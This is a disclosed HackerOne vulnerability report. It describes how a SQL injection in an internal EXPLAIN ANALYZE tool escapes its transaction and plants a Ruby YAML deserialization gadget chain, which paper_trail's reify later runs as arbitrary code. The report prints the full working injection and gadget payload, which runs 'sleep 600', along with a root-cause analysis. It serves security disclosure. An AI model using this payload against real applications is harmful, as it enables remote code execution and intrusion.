# Ability to escape database transaction through SQL injection, leading to arbitrary code execution

## Report Details
- **Report ID**: 1663299
- **URL**: https://hackerone.com/reports/1663299
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-08-08T20:20:37.685Z
- **Disclosed**: 2022-08-09T18:58:36.634Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
HackerOne has an internal backend interface that gives debugging capabilities to its engineers. One of the features is the ability to run `EXPLAIN ANALYZE` queries against a connected database. This feature is accessible by a handful of engineers. The feature is vulnerable to a SQL injection that allows an attacker to escape the transaction that is wrapped around the `EXPLAIN ANALYZE` query. This SQL injection can be leveraged to execute arbitrary ruby on an application server.

This vulnerability will be demonstrated against a local development environment.

# Proof of concept
- go to http://localhost:8080/support/sql_query_analyzer
- analyze the following query using the `public` database connection:

```sql
SELECT
        1
;

ROLLBACK
;

INSERT
    INTO
        user_versions (
            item_type
            ,item_id
            ,event
            ,email
            ,object
        )
    VALUES (
        'User'
        ,2
        ,'update'
        , 'uniquekeywordtotriggercode@hackerone.com'
        ,'---
username:
  - !ruby/object:Gem::Installer
      i: x
  - !ruby/object:Gem::SpecFetcher
      i: y
  - !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
            read: 0
            header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
            socket: &1 !ruby/object:Gem::RequestSet
                sets: !ruby/object:Net::WriteAdapter
                    socket: !ruby/module ''Kernel''
                    method_id: :system
                git_set: sleep 600
            method_id: :resolve '
    )
;

-- 
```
- visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com and observe that the page will hang for 600 seconds and then result in a 500 internal server error, proving that it executes the `sleep 600` command in the injected object.

# Root cause
The following Ruby code is used to execute the `EXPLAIN ANALYZE` query:

```ruby
# ...
explain_analyze = "EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}"

begin
  conn.transaction(requires_new: true) do
    block = proc do
      analyze_result = conn.protected_attribute.with_parameters(params) do
        conn.execute explain_analyze
      end

      fail ActiveRecord::Rollback
    end

    if config[:use_protected_schema]
      ProtectedAttribute::SchemaUtility.with_requester(user) do
        block.call
      end
    else
      block.call
    end
# ...
```

The code is written so that it would wrap each analyze query in a transaction. This avoids permanent side effects of running the query, because `EXPLAIN ANALYZE` will still execute the SQL query. The interpolation of the `raw_sql` variable can be used to escape the current transactions and make any changes persist. The following part is used to jump out of the transaction:

```sql
SELECT
        1
;

ROLLBACK
;
```

Then, a payload is injected into a table called `user_versions` and a comment identifier (`-- `) is used to block the `ROLLBACK` statement that is appended by the `transaction` block. The `user_versions` table keeps a paper trail of changes on `User` objects. For example, when someone changes their username, the application keeps a snapshot of the previous object in the `user_versions` table. HackerOne uses a gem called [paper_trail](https://github.com/paper-trail-gem/paper_trail) for this. This gem comes with a useful function to reinstantiate an old version of an object, called `reify`. When this method is called, the YAML from the `object` attribute is deseriealized and is used to initialize the class stored in the `item_type` column. This method inherently trusts the object stored in `object` however. Because the attacker can persist a new version, it can control the object that would be deserialized. In the past, multiple YAML deserialization techniques have been published. For the proof of concept, I reused [Stratum Security's](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) payload from 2021.

There is only one place where the `reify` method is called on a `UserVersion` object, and it's through the historic users feature. It's using the following code:

```ruby
def index
  if params[:historic_user_input].present?
    if params[:historic_user_input].include? '@'
      versions = UserVersion.where(email: params[:historic_user_input]).order(id: :asc).to_a
      current_owner = User.find_by(email: params[:historic_user_input])
    else
      # ...
    end

    # ...

    original_user = versions.first.reify
```

This code will pull all `UserVersion` objects based on the `email` attribute and sorts them based on the primary key ascending. Because we also can control the `email` attribute through the SQL injection, we need to simply persist a version with a value that is unique in the table, such as `uniquekeywordtotriggercode@hackerone.com`. When the page is loaded with that as the value for the `historic_user_input`, it will only return our injected object and reinstantiate it, leading to the execution of arbitrary ruby code or, in this case, a command.

## Impact

Execution of arbitrary ruby code.

## Attachments
No attachments
